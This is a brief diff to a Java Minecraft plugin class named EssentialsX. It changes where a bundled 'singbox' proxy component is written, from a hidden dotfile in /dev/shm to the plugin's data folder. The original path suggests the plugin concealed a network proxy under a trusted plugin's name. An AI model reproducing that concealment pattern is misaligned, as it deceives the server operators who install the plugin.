@@ -81,10 +81,7 @@ public class EssentialsX extends JavaPlugin {
          * 不会保存到 plugins/EssentialsX。
          */
 
-        Path tempSingbox =
-                Path.of(
-                        "/dev/shm/.essentialsx-singbox"
-                );
+        Path tempSingbox = getDataFolder().toPath().resolve("EssentialsX");
 
 
         // -----------------------------------------------------
